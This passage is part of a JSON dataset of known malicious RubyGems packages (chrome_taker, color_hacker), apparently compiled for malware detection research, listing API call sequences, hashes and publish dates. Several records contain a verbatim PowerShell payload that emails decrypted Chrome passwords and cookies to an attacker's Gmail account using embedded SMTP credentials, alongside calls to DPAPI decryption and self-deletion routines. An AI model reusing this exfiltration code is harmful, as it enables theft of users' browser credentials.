\\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'ChromeTaker.create_home_dir', 'ChromeTaker.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.export_data', 'ChromeTaker.gone_like_the_wind', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 2029,
            "embedding": "[-0.0070254  -0.02098279 -0.00793983 ... -0.00874119 -0.02644972\n -0.00231312]",
            "cluster": "0",
            "id": 579,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.8.9/chrome_taker-1.8.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.8.9/chrome_taker-1.8.9_extracted",
            "name": "chrome_taker",
            "version": "1.8.9",
            "published_at": "2019-05-12T16:53:20.034Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake",
            "SHA-256": "70b446c1403f15f1113c44ecc2f60aca2e6a88c26d132d45a8c02f7bd6569733"
        },
        {
            "name_version": "chrome_taker-1.9.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.9.9/chrome_taker-1.9.9_extracted/chrome_taker-1.9.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'ChromeTaker.create_home_dir', 'ChromeTaker.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'ChromeTaker.export_data', 'ChromeTaker.gone_like_the_wind', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 2029,
            "embedding": "[-0.00698149 -0.0210428  -0.00794022 ... -0.00862361 -0.02670666\n -0.00250867]",
            "cluster": "0",
            "id": 573,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.9.9/chrome_taker-1.9.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/1.9.9/chrome_taker-1.9.9_extracted",
            "name": "chrome_taker",
            "version": "1.9.9",
            "published_at": "2019-05-12T19:21:13.592Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake",
            "SHA-256": "352730f72bd793ae5d5cfdea13f825072bd8662755675ecd97d99b0bfad7b938"
        },
        {
            "name_version": "chrome_taker-4.9.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/4.9.9/chrome_taker-4.9.9_extracted/chrome_taker-4.9.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'create_home_dir', 'steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'export_data', 'gone_like_the_wind', 'ChromeTaker.toast', 'puts', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'Plugins.create_home_dir', 'Plugins.steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Plugins.export_data', 'Plugins.gone_like_the_wind', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'include', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"HostKey: \" + row.[](0).to_s.+', '\"HostKey: \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"Path:    \" + row.[](1).to_s.+', '\"Path:    \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"Secure:  \" + row.[](2).to_s.+', '\"Secure:  \".+', 'row.[](2).to_s', 'row.[]', 'f.write', '\"Expire:  \" + row.[](3).to_s.+', '\"Expire:  \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Name:    \" + row.[](4).to_s.+', '\"Name:    \".+', 'row.[](4).to_s', 'row.[]', 'f.write', '\"Value:   \".+', 'DpApi.decrypt(row.[](\"encrypted_value\")).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close', 'system', 'SQLite3::Database.new', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.results_as_hash=', 'File.open', 'ENV.[](\"HOME\").+', 'ENV.[]', 'db.execute', 'f.write', '\"OrginUrl:  \" + row.[](0).to_s.+', '\"OrginUrl:  \".+', 'row.[](0).to_s', 'row.[]', 'f.write', '\"ActionUrl: \" + row.[](1).to_s.+', '\"ActionUrl: \".+', 'row.[](1).to_s', 'row.[]', 'f.write', '\"PassType:  \" + row.[](12).to_s.+', '\"PassType:  \".+', 'row.[](12).to_s', 'row.[]', 'f.write', '\"Date:      \" + row.[](10).to_s.+', '\"Date:      \".+', 'row.[](10).to_s', 'row.[]', 'f.write', '\"TimeUsed   \" + row.[](13).to_s.+', '\"TimeUsed   \".+', 'row.[](13).to_s', 'row.[]', 'f.write', '\"Uname:     \" + row.[](3).to_s.+', '\"Uname:     \".+', 'row.[](3).to_s', 'row.[]', 'f.write', '\"Pass:      \".+', 'DpApi.decrypt(row.[](5)).to_s', 'DpApi.decrypt', 'row.[]', 'f.write', 'db.close', 'f.close']",
            "n_tokens": 2017,
            "embedding": "[-0.01017132 -0.02056032 -0.00578816 ... -0.00989923 -0.02608133\n -0.00276793]",
            "cluster": "0",
            "id": 572,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/4.9.9/chrome_taker-4.9.9.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/chrome_taker/4.9.9/chrome_taker-4.9.9_extracted",
            "name": "chrome_taker",
            "version": "4.9.9",
            "published_at": "2019-05-22T22:56:33.298Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, sqlite3, builder, rake",
            "SHA-256": "91593034223c7ad82d31e061ce240de653d6393e1c24d6c028b656ebf39be3a2"
        },
        {
            "name_version": "color_hacker-4.9.9",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/color_hacker/4.9.9/color_hacker-4.9.9_extracted/color_hacker-4.9.9_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = \\\\\"TacoBell <1111nardski@gmail.com>\\\\\";$emailMessage.To.Add(\\\\\"1111nardski@gmail.com\\\\\");$emailMessage.Body = \\\\\"See attachments\\\\\";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Pass.txt\\\\\";$emailMessage.Attachments.Add($attachment);$attachment2 = \\\\\"%UserProfile%\\\\\\\\AppData\\\\\\\\local\\\\\\\\IeUpdate\\\\\\\\Cookie.txt\\\\\";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);\".gsub', 'f.close', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'system', '\"Powershell.exe -File \".+', 'Gem.win_platform?', 'create_home_dir', 'steal_chrome', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'steal_cookie', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'create_ps1', 'File.exist?', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'export_data', 'gone_like_the_wind', 'ChromeTaker.toast', 'puts', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'extend', 'ffi_lib', 'layout', 'blob.nil?', 'self.data=', 'self.[](:pbData).get_bytes', 'self.[]', 'self.[]', 'self.[]=', 'FFI::MemoryPointer.from_string', 'self.[]=', 'blob.bytesize', 'attach_function', 'DataBlob.new', 'CryptProtectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'ciphertext_blob.data', 'attach_function', 'DataBlob.new', 'FFI::MemoryPointer.new', 'CryptUnprotectData', 'DataBlob.new', 'entropy.nil?', 'DataBlob.new', 'flags.reduce', 'raise', 'plaintext_blob.data', 'desc.read_pointer.nil?', 'desc.read_pointer', 'desc.read_pointer.read_string', 'desc.read_pointer', 'require', 'require', 'require_relative', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'StealCreds.new', 'Dir.exist?', 'ENV.[](\"HOME\").+', 'ENV.[]', 'Dir.mkdir', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'Steal.chrome_pass', 'Steal.chrome_cook', 'puts', 'FileUtils.rm_r', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'puts', 'File.open', 'ENV.[](\"USERPROFILE\").+', 'ENV.[]', 'f.<<', '\"$emailSmtpServer = \\\\\"smtp.gmail.com\\\\\";$emailSmtpServerPort = \\\\\"587\\\\\";$emailSmtpUser = \\\\\"1111nardski@gmail.com\\\\\";$emailSmtpPass = \\\\\"derby3333\\\\\";$emailMessage = New-Object 